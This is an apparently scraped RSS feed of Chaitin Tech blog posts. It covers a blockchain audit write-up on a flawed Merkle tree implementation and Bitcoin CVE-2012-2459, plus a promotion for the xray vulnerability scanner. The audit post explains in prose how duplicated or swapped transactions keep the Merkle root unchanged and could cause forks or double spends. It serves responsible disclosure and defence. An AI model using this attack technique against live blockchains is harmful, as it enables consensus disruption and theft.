class=&quot;invisible&quot;&gt;totype-pollution-nsec18/blob/master/paper/JavaScript_prototype_pollution_attack_in_NodeJS.pdf&lt;/span&gt;&lt;span class=&quot;ellipsis&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//xz.aliyun.com/t/2802&quot; class=&quot; external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;span class=&quot;invisible&quot;&gt;https://&lt;/span&gt;&lt;span class=&quot;visible&quot;&gt;xz.aliyun.com/t/2802&lt;/span&gt;&lt;span class=&quot;invisible&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//xz.aliyun.com/t/2735&quot; class=&quot; external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;span class=&quot;invisible&quot;&gt;https://&lt;/span&gt;&lt;span class=&quot;visible&quot;&gt;xz.aliyun.com/t/2735&lt;/span&gt;&lt;span class=&quot;invisible&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;</description>
<author>婴宁</author>
<guid isPermaLink="false">2019-09-28-61990774</guid>
<pubDate>Sat, 28 Sep 2019 00:00:00 +0800</pubDate>
</item>
<item>
<title>区块链公链审计过程中遇到的Merkle Tree底层实现问题 及CVE-2012-2459分析</title>
<link>https://henix.github.io/feeds/zhuanlan.chaitin-tech/2019-09-28-60064645.html</link>
<description>&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/60064645&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-c3847e11fc0d5797a282550a8883f5c2_b.jpg&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;p&gt;&lt;b&gt;前言&lt;/b&gt;&lt;/p&gt;&lt;p&gt;区块链项目态势汹涌，在经历了比特币、以太坊时代之后，大量拥有着不同特点与优势的公链项目如雨后春笋般层出不穷，吸引着人们的眼球。&lt;/p&gt;&lt;p&gt;这些项目既拥有区块链1.0、2.0时代中，数字货币交易、去中心化、支持智能合约的特征，也通过更加巧妙的共识机制、更复杂的技术和金融模型，来解决现有的种种问题，助区块链技术步入我们的生活。&lt;/p&gt;&lt;p&gt;&lt;b&gt;在此期间，长亭科技区块链安全组也在关注着诸多公链项目，为这些公链项目的发展与上线保驾护航。&lt;/b&gt;在此前一项公链审计的项目过程中，我们发现了一个有意思的关于 Merkle Tree 底层实现漏洞。下面将分享发现该漏洞的前期技术积累，以及发现过程。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;公链项目审计&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;回顾2018年，对于区块链安全从业人员而言，大部分人印象颇深的可能都是以太坊的诸多合约漏洞，EOS 公链上层出不穷的合约问题，以及少数公链漏洞信息。使用搜索引擎查找和区块链相关的审计类文章，也大多为智能合约的 checklist、智能合约的审计分析等，针对公链审计类的技术分享并无很多。&lt;b&gt;这里推荐大家一份由长亭科技编写的国内首发的&lt;/b&gt;&lt;a href=&quot;https://link.zhihu.com/?target=http%3A//mp.weixin.qq.com/s%3F__biz%3DMzIwNDA2NDk5OQ%3D%3D%26mid%3D2651371613%26idx%3D1%26sn%3Dc28a33f408fa34988e6fcc2082f56238%26chksm%3D8d39c9d5ba4e40c30ebfc4cdd864474ea7e10d9dc1793d052ca9803fe90cb1e985fe33f3ae00%26scene%3D21%23wechat_redirect&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;《区块链安全生存指南》&lt;/a&gt;&lt;b&gt;，其中介绍了当下区块链行业环境，以及近年来区块链业内的一些著名事件等。同时分享长亭科技日前发布的&lt;/b&gt;&lt;a href=&quot;https://link.zhihu.com/?target=http%3A//mp.weixin.qq.com/s%3F__biz%3DMzIwNDA2NDk5OQ%3D%3D%26mid%3D2651372563%26idx%3D2%26sn%3D5496dcfd278c2d11c8cad17aee99fb23%26chksm%3D8d39cd9bba4e448d8ced57e6dfa7df8bd905d24c71d46a3025f900f1f9e91057eeffa70abada%26scene%3D21%23wechat_redirect&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;《公链审计checklist》&lt;/a&gt;&lt;b&gt;，以供公链项目开发者参考。&lt;/b&gt;&lt;/p&gt;&lt;p&gt;审计区块链公链项目，与通常的软件代码审计略有不同。通常的代码审计，我们会考虑语言特性以及该语言的 0day 或 1day 漏洞，结合常见业务场景，分析代码的实现。&lt;b&gt;区块链公链项目，其本身代码量较多，在项目背后，还有严谨的金融货币模型以及共识模型，且无较为实用的审计工具，需要更多以来人工审计，审计的定制化程度高，难度及工作量大。依我理解，我们主要从以下方向入手：&lt;/b&gt;&lt;/p&gt;&lt;blockquote&gt;语言特性及其已知漏洞&lt;br/&gt;底层实现【密码学、序列化、大数运算等】&lt;br/&gt;区块链基本元素的实现【区块、交易、链】&lt;br/&gt;区块链行为的逻辑【生成一个区块、交易进入 tx_pool 等】&lt;br/&gt;区块链的其他组件【p2p、rpc、钱包等】&lt;br/&gt;共识算法合理性&lt;br/&gt;金融模型合理性&lt;br/&gt;历史公链漏洞&lt;/blockquote&gt;&lt;p class=&quot;ztext-empty-paragraph&quot;&gt;&lt;br/&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;漏洞发现过程&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;我们在审计过程中发现的漏洞利用方式，源于该公链项目在实现 Merkle Tree 逻辑时，与常规实现方式有些许不同。在整理之前比特币区块链、以太坊区块链，出现过的漏洞时，发现了可能利用的漏洞点，经过确认发现可以影响不同节点间达成共识，进而造成分叉。&lt;/p&gt;&lt;p&gt;&lt;b&gt;在发现问题后，长亭科技立刻汇报给公链项目方，公链开发者响应迅速，非常重视此次安全问题，即刻完成了修复。&lt;/b&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;什么是 Merkle Tree&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;Merkle Tree，一般也称为 Merkle Hash Tree。是数据结构中我们所了解的树，其各个节点均包含 Hash 值。&lt;/p&gt;&lt;p&gt;&lt;b&gt;Merkle Tree 具有以下的特点：&lt;/b&gt;&lt;/p&gt;&lt;ol&gt;&lt;li&gt;它是一棵树，具有数据结构中，树结构的所有特点。【在讲解中我们默认其为二叉树】&lt;/li&gt;&lt;li&gt;Merkle Tree 的叶子节点中存放数据。非叶子节点的 value，是由其左右两子节点，经过组合和 Hash 运算获得。&lt;/li&gt;&lt;/ol&gt;&lt;p&gt;让我们举个例子来表示：&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-83202c519637271c10b9d061a6b8ce08_b.jpg&quot; data-rawwidth=&quot;864&quot; data-rawheight=&quot;575&quot; data-size=&quot;normal&quot; data-caption=&quot;&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;864&quot; data-original=&quot;https://pic1.zhimg.com/v2-83202c519637271c10b9d061a6b8ce08_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-83202c519637271c10b9d061a6b8ce08_b.jpg&quot; data-rawwidth=&quot;864&quot; data-rawheight=&quot;575&quot; data-size=&quot;normal&quot; data-caption=&quot;&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;864&quot; data-original=&quot;https://pic1.zhimg.com/v2-83202c519637271c10b9d061a6b8ce08_r.jpg&quot; data-actualsrc=&quot;https://pic1.zhimg.com/v2-83202c519637271c10b9d061a6b8ce08_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;我们可以看到，只有叶子节点中存放了 Data【Tx Hash】，而其上面每一个非叶子节点的 value，都是他们孩子的 value，经过组合和哈希运算得到的。&lt;/p&gt;&lt;p&gt;Merkle Tree 被广泛应用于对比以及验证处理。&lt;b&gt;在区块链技术中，Merkle Tree 被用于验证各区块中的交易，在传输过程中是否被篡改。&lt;/b&gt;因为我们可以看到，倘若修改任一叶子节点的内容，这棵 Merkle Tree 的 root 节点的值【Merkle 根】就会随之改变，可以通过判断 Merkle 根来得知，该区块中，有交易可能传输出错或被恶意篡改。&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-e18f671e9b07b13a615eb4bfd7efd1e7_b.jpg&quot; data-rawwidth=&quot;864&quot; data-rawheight=&quot;575&quot; data-size=&quot;normal&quot; data-caption=&quot;&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;864&quot; data-original=&quot;https://pic4.zhimg.com/v2-e18f671e9b07b13a615eb4bfd7efd1e7_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-e18f671e9b07b13a615eb4bfd7efd1e7_b.jpg&quot; data-rawwidth=&quot;864&quot; data-rawheight=&quot;575&quot; data-size=&quot;normal&quot; data-caption=&quot;&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;864&quot; data-original=&quot;https://pic4.zhimg.com/v2-e18f671e9b07b13a615eb4bfd7efd1e7_r.jpg&quot; data-actualsrc=&quot;https://pic4.zhimg.com/v2-e18f671e9b07b13a615eb4bfd7efd1e7_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;h2&gt;&lt;b&gt;审计中发现的实现方式&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;核心代码【有修改】：&lt;/p&gt;&lt;p&gt;# 外层为循环，以建立Merkle Tree&lt;/p&gt;&lt;p&gt;if hashList[i+1] == None :&lt;/p&gt;&lt;p&gt;    hashList[p] = sha3(hashList[i]+hashList[i])&lt;/p&gt;&lt;p&gt;else :&lt;/p&gt;&lt;p&gt;  if hashList[i] &amp;gt; hashList[i+1] :&lt;/p&gt;&lt;p&gt;        hashList[p] = sha3(hashList[i]+hashList[i+1])&lt;/p&gt;&lt;p&gt;  else:&lt;/p&gt;&lt;p&gt;        hashList[p] = sha3(hashList[i+1]+hashList[i])&lt;/p&gt;&lt;p class=&quot;ztext-empty-paragraph&quot;&gt;&lt;br/&gt;&lt;/p&gt;&lt;p&gt;在审计过程中，当考察到 Merkle Tree 底层实现方式时，发现其实现有一定违和感，具体如下：&lt;/p&gt;&lt;ol&gt;&lt;li&gt;先根据 tx_hash 数量，建立一棵完全二叉树&lt;/li&gt;&lt;li&gt;将 tx_hash，按顺序放至叶子节点中&lt;/li&gt;&lt;li&gt;通过以下算法算得上层节点的 Hash 值：&lt;/li&gt;&lt;ol&gt;&lt;li&gt;对于某一非叶子节点，将其两孩子的 value 进行比较，&lt;b&gt;序列大者靠前&lt;/b&gt;&lt;/li&gt;&lt;li&gt;将排好的两孩子，进行Hash运算，得到的 Hash 值为该节点的 value&lt;/li&gt;&lt;/ol&gt;&lt;li&gt;如此往复，建立 Merkle Tree，算得根节点的 value&lt;/li&gt;&lt;/ol&gt;&lt;p&gt;&lt;b&gt;举例说明：&lt;/b&gt;&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-6f7bfce653946b214480f74ce1c68f56_b.jpg&quot; data-rawwidth=&quot;864&quot; data-rawheight=&quot;519&quot; data-size=&quot;normal&quot; data-caption=&quot;&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;864&quot; data-original=&quot;https://pic3.zhimg.com/v2-6f7bfce653946b214480f74ce1c68f56_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-6f7bfce653946b214480f74ce1c68f56_b.jpg&quot; data-rawwidth=&quot;864&quot; data-rawheight=&quot;519&quot; data-size=&quot;normal&quot; data-caption=&quot;&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;864&quot; data-original=&quot;https://pic3.zhimg.com/v2-6f7bfce653946b214480f74ce1c68f56_r.jpg&quot; data-actualsrc=&quot;https://pic3.zhimg.com/v2-6f7bfce653946b214480f74ce1c68f56_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;初看此处时，觉得实现 Merkle Tree 的方式有些奇怪，进行了一次两孩子的 value 比较，但想到 Merkle Tree 的主要意义在于校验，防止篡改。实现方式略有不同可能影响不大，遂只做了记录。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;Bitcoin 漏洞CVE-2012-2459&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;在整理曾经出现的公链漏洞时，发现了这样一个有名的比特币 DoS 漏洞。&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-0b948b04d9f067e633fce750dbb79d03_b.jpg&quot; data-rawwidth=&quot;864&quot; data-rawheight=&quot;354&quot; data-size=&quot;normal&quot; data-caption=&quot;&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;864&quot; data-original=&quot;https://pic4.zhimg.com/v2-0b948b04d9f067e633fce750dbb79d03_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-0b948b04d9f067e633fce750dbb79d03_b.jpg&quot; data-rawwidth=&quot;864&quot; data-rawheight=&quot;354&quot; data-size=&quot;normal&quot; data-caption=&quot;&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;864&quot; data-original=&quot;https://pic4.zhimg.com/v2-0b948b04d9f067e633fce750dbb79d03_r.jpg&quot; data-actualsrc=&quot;https://pic4.zhimg.com/v2-0b948b04d9f067e633fce750dbb79d03_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;通过了 Merkle Root 的根认证的区块，但其实并不合法。可能导致区块链分叉，或是进行双花攻击等，危害性较高，攻击方式较为简单，我们来分析该漏洞成因。&lt;/p&gt;&lt;p&gt;在旧版本的 Bitcoin 客户端中，其实现 Merkle Tree 的建立【计算该区块交易的 Merkle 根】的过程和通常的方式没有太大区别，当区块中交易个数为奇数时，会进行一个这样的操作：&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-d82d17eb5df21b113137c0f7a69ad371_b.jpg&quot; data-rawwidth=&quot;864&quot; data-rawheight=&quot;575&quot; data-size=&quot;normal&quot; data-caption=&quot;&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;864&quot; data-original=&quot;https://pic2.zhimg.com/v2-d82d17eb5df21b113137c0f7a69ad371_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-d82d17eb5df21b113137c0f7a69ad371_b.jpg&quot; data-rawwidth=&quot;864&quot; data-rawheight=&quot;575&quot; data-size=&quot;normal&quot; data-caption=&quot;&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;864&quot; data-original=&quot;https://pic2.zhimg.com/v2-d82d17eb5df21b113137c0f7a69ad371_r.jpg&quot; data-actualsrc=&quot;https://pic2.zhimg.com/v2-d82d17eb5df21b113137c0f7a69ad371_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;在计算 Merkle 根时，若其叶子节点的个数为奇数个，则复制最后一笔交易的 Hash 值，参与建立 Merkle Tree【并不是复制一笔交易出来，不能有重复的交易】。&lt;/p&gt;&lt;p&gt;看上去没有什么太大的问题，只是计算 Merkle 根时，对边界的处理。但 CVE-2012-2459 漏洞，利用的就是这一个特性。&lt;/p&gt;&lt;p&gt;&lt;b&gt;区块A：&lt;/b&gt;&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-73cf9bedcc46ccff5dbc3459d28a781d_b.jpg&quot; data-rawwidth=&quot;568&quot; data-rawheight=&quot;238&quot; data-size=&quot;normal&quot; data-caption=&quot;&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;568&quot; data-original=&quot;https://pic2.zhimg.com/v2-73cf9bedcc46ccff5dbc3459d28a781d_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-73cf9bedcc46ccff5dbc3459d28a781d_b.jpg&quot; data-rawwidth=&quot;568&quot; data-rawheight=&quot;238&quot; data-size=&quot;normal&quot; data-caption=&quot;&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;568&quot; data-original=&quot;https://pic2.zhimg.com/v2-73cf9bedcc46ccff5dbc3459d28a781d_r.jpg&quot; data-actualsrc=&quot;https://pic2.zhimg.com/v2-73cf9bedcc46ccff5dbc3459d28a781d_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;攻击者首先选择一个有奇数笔交易的区块，构造区块时，将最后一笔交易复制一份，加入该区块中。&lt;/p&gt;&lt;p&gt;&lt;b&gt;区块B:&lt;/b&gt;&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-5d4dae1f039cdd88a958f386286a3fe1_b.jpg&quot; data-rawwidth=&quot;568&quot; data-rawheight=&quot;297&quot; data-size=&quot;normal&quot; data-caption=&quot;&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;568&quot; data-original=&quot;https://pic2.zhimg.com/v2-5d4dae1f039cdd88a958f386286a3fe1_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-5d4dae1f039cdd88a958f386286a3fe1_b.jpg&quot; data-rawwidth=&quot;568&quot; data-rawheight=&quot;297&quot; data-size=&quot;normal&quot; data-caption=&quot;&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;568&quot; data-original=&quot;https://pic2.zhimg.com/v2-5d4dae1f039cdd88a958f386286a3fe1_r.jpg&quot; data-actualsrc=&quot;https://pic2.zhimg.com/v2-5d4dae1f039cdd88a958f386286a3fe1_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-9711d698a37a11934161755d786d319e_b.jpg&quot; data-rawwidth=&quot;864&quot; data-rawheight=&quot;506&quot; data-size=&quot;normal&quot; data-caption=&quot;&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;864&quot; data-original=&quot;https://pic3.zhimg.com/v2-9711d698a37a11934161755d786d319e_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-9711d698a37a11934161755d786d319e_b.jpg&quot; data-rawwidth=&quot;864&quot; data-rawheight=&quot;506&quot; data-size=&quot;normal&quot; data-caption=&quot;&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;864&quot; data-original=&quot;https://pic3.zhimg.com/v2-9711d698a37a11934161755d786d319e_r.jpg&quot; data-actualsrc=&quot;https://pic3.zhimg.com/v2-9711d698a37a11934161755d786d319e_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;区块A是一个正常的区块，区块B是拥有重复交易的区块。在共识过程中，会因为 tx_3 和 tx_2 一致，而造成出错并抛弃。但这两个区块根据上面的描述，对应的 Merkle 根是一致的。对应的区块头也是一致的。&lt;/p&gt;&lt;p&gt;&lt;b&gt;攻击者可以构造同样的区块头，在传播广播区块时，广播不同交易列表的区块信息，导致网络中接收到原区块的节点认为此区块有效，接收到恶意区块的节点认为此区块无效，造成不同节点面对这一区块不能达到共识，进而使区块链分叉，或是进行双花攻击等，危害极大。&lt;/b&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;漏洞利用方式&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;回到我们的审计过程中，类似上面的例子，思考在此项目中是否也会有类似的攻击手法。&lt;/p&gt;&lt;p&gt;我们发现，对于任意两笔相邻的交易，我们可以调换他们的位置，来使 Merkle 根不变，更有甚者，我们可以交换任意一个节点下，两个孩子为根的树的位置，也不会改变 Merkle 根的值。&lt;/p&gt;&lt;p&gt;&lt;b&gt;经过对于其他部分对区块和交易的校验分析之后，我们发现可以通过构造两笔特定的交易，造成和上面比特币区块链类似的攻击效果。&lt;/b&gt;经过攻击链的设计和验证后，验证了此方法的可能性。此公链在运行过程中，有可能因此漏洞，被进行强制分叉或是双花攻击等。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;总结&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;汇报该漏洞后，公链项目方十分重视这一问题，响应迅速，立刻修复了该实现问题。&lt;/p&gt;&lt;p&gt;在审计该项目的一些底层实现过程中，我们审计到这个较为经典的漏洞，并根据此漏洞，构造了一条完整的攻击链，达到了对公链强制分叉的影响。这也提醒了我们： &lt;b&gt;代码千万行，安全第一行。实现不规范，首席两行泪。&lt;/b&gt;&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-fc05b37019760c9652d86299a7047340_b.png&quot; data-rawwidth=&quot;73&quot; data-rawheight=&quot;72&quot; data-size=&quot;normal&quot; data-caption=&quot;&quot; class=&quot;content_image&quot; width=&quot;73&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-fc05b37019760c9652d86299a7047340_b.png&quot; data-rawwidth=&quot;73&quot; data-rawheight=&quot;72&quot; data-size=&quot;normal&quot; data-caption=&quot;&quot; class=&quot;content_image lazy&quot; width=&quot;73&quot; data-actualsrc=&quot;https://pic1.zhimg.com/v2-fc05b37019760c9652d86299a7047340_b.png&quot;/&gt;&lt;/figure&gt;&lt;p&gt;对于已证明安全的密码学方案或技术方案，若实现不规范，亦有可能成为漏洞，造成严重后果。&lt;/p&gt;&lt;p&gt;长亭科技区块链安全组，在区块链安全技术方面已有相当的积累，拥有多个区块链相关的漏洞 CVE 编号，曾进行过大量的公链审计、智能合约审计项目，提供诸多企业级服务，为众多优秀的公链社区提供了建设性的意见。&lt;/p&gt;&lt;hr/&gt;&lt;blockquote&gt;&lt;b&gt;长亭科技安全服务&lt;/b&gt;&lt;br/&gt;&lt;b&gt;7*24小时守护您的安全！&lt;/b&gt;&lt;br/&gt;&lt;b&gt;邮箱：support@chaitin.com&lt;/b&gt;&lt;br/&gt;&lt;b&gt;应急响应热线：4000-327-707&lt;/b&gt;&lt;/blockquote&gt;</description>
<author>婴宁</author>
<guid isPermaLink="false">2019-09-28-60064645</guid>
<pubDate>Sat, 28 Sep 2019 00:00:00 +0800</pubDate>
</item>
<item>
<title>长亭xray高级版强势发布</title>
<link>https://henix.github.io/feeds/zhuanlan.chaitin-tech/2019-09-27-84486194.html</link>
<description>&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/84486194&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-9d63afb975b5674543a7d68f2f83c41d_b.jpg&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;p&gt;从8月到现在，短短一个月的时间，xray社区活跃人数又double啦！！！&lt;/p&gt;&lt;p&gt;xray不仅是漏洞检测工具和poc编写、运行工具，更是一个开放性的技术交流平台，是安全技术爱好者的大本营。高级版便是在原有社区版的基础上，充分吸纳使用者的反馈建议后，应运而生。 &lt;/p&gt;&lt;p&gt;相比于社区版，高级版都增加了哪些功能呢？小姐姐提前来点剧透，比如：Struts 2、ThinkPHP系列的检测插件、子域名收集、Web爬虫等等，其他更多功能敬请期待！！&lt;/p&gt;&lt;p&gt;先来了解一下这四个功能吧。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;Struts 2&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;从2007年至今，已披漏的Struts相关漏洞数量近60个，而Struts 2作为世界上最流行的Java Web服务器框架之一，在金融、互联网等行业被大规模使用。xray作为精细化漏洞检测工具的代表，有针对性的处理了多种框架类应用。&lt;/p&gt;&lt;p&gt;xray安全研究团队对Struts 2漏洞的检测逻辑进行了深入研究，与其他漏洞检测工具相比，xray高级版请求数量更少、检测更加精准，安全指数更高，支持检测Struts2的OGNL表达式注入（涉及到s2-001、s2-013、s2-048、s2-053、s2-012、s2-014），devMode代码执行，s2-005、s2-015、s2-016、s2-032、s2-037、s2-045、s2-052、s2-057等高危漏洞。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;Thinkphp&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;Thinkphp是一个诞生十多年的老牌框架，在中国互联网圈里的使用也极为广泛，很多站长以及平台都在使用这套开源系统来建站。xray支持参数识别和处理后调用通用sql注入模块来检测Thinkphp的sql注入漏洞，同时还支持 `InvokeFunction` 和 `method` 系列远程代码执行漏洞的无害化检测。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;子域名收集&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;xray高级版子域名收集主要分为三个部分：DNS域传送检测、外部信息源收集子域名（持续增加并且随版本维护信息源）和子域名爆破。&lt;/p&gt;&lt;p&gt;特色功能：&lt;/p&gt;&lt;p&gt;1. 可选可视化交互Console UI，支持一键复制结果，一键保存文件；&lt;/p&gt;&lt;p&gt;2. 域名泛解析自动检查与智能规避泛解析；&lt;/p&gt;&lt;p&gt;3. 子域名递归爆破，层数可控；&lt;/p&gt;&lt;p&gt;4. 支持高并发（DNS查询并发），且并发数量可精准控制：在200的 DNS并发查询下，几十秒内可以完成对常见域名（非爆破）的检测；&lt;/p&gt;&lt;p&gt;5. 内置主字典3000余条，副字典160+条（用户检测多级域名）。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;Web爬虫&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;在xray 0.8.0版本中，我们加入了以爬虫方式触发的主动扫描，受到了很多社区朋友的认可，也收集了一些不足之处，因此我们计划投入核心精力加强Web 爬虫。&lt;/p&gt;&lt;p&gt;为了更适应专业用户的使用，为了打造专业的被动扫描引擎，为了打造专业的Web 爬虫，我们将合并现有社区版爬虫扫描与企业版中的部分智能化特性，与扫描引擎解耦，在高级版中作为独立的爬虫功能提供。这样我们可以方便的只使用 Web 爬虫进行业务资产清点，而不进行漏洞扫描，也可以给 Web 爬虫加代理实现原有的爬虫扫描功能。 &lt;/p&gt;&lt;p&gt;截止到目前，不少白帽子已经通过xray挖到了多家SRC的漏洞，同时，通过xray的poc编写、运行工具，社区白帽子可以在漏洞爆发后的第一时间输出poc供自己使用。&lt;/p&gt;&lt;p&gt;当然，这不是自吹自擂，而是来源于社区同学，不信你看。&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-f9ea277b8334026dd2638e407323e4cf_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;253&quot; data-rawheight=&quot;210&quot; class=&quot;content_image&quot; width=&quot;253&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-f9ea277b8334026dd2638e407323e4cf_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;253&quot; data-rawheight=&quot;210&quot; class=&quot;content_image lazy&quot; width=&quot;253&quot; data-actualsrc=&quot;https://pic4.zhimg.com/v2-f9ea277b8334026dd2638e407323e4cf_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-0bef3b58412668c5f37aa81cd1b5b473_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;759&quot; data-rawheight=&quot;250&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;759&quot; data-original=&quot;https://pic4.zhimg.com/v2-0bef3b58412668c5f37aa81cd1b5b473_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-0bef3b58412668c5f37aa81cd1b5b473_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;759&quot; data-rawheight=&quot;250&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;759&quot; data-original=&quot;https://pic4.zhimg.com/v2-0bef3b58412668c5f37aa81cd1b5b473_r.jpg&quot; data-actualsrc=&quot;https://pic4.zhimg.com/v2-0bef3b58412668c5f37aa81cd1b5b473_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;xray 经过数个版本的更迭，基本覆盖了对常见漏洞的fuzzing, 稳定性和扫描效果上都有了很大的提高，但从宏观上来看，漏洞检测类的安全工具POC的质量和数量永远是一个不可绕过的鸿沟，个人乃至团队的力量在这件事面前显得微不足道。我们希望借助于大家的反馈，来对其进行持续的迭代优化，集结大家的力量壮大它的POC库，由此帮助xray更快、更好的成长。 &lt;/p&gt;&lt;p&gt;奖励措施：&lt;/p&gt;&lt;ol&gt;&lt;li&gt;提交1个 POC 并被收录，可被邀请进入xray社区核心贡献者群，与 xray社区核心成员共同探讨，同时可获得xray社区版文化衫一件；&lt;/li&gt;&lt;li&gt;提交3个POC并被收录，可获得线下活动入场券，参与xray社区线下技术分享，同时获得Pwnhub社区邀请码；&lt;/li&gt;&lt;li&gt;提交5个POC并被收录，可获得 &lt;b&gt;xray高级版license&lt;/b&gt;，及更多不定期内部福利。&lt;/li&gt;&lt;/ol&gt;&lt;p 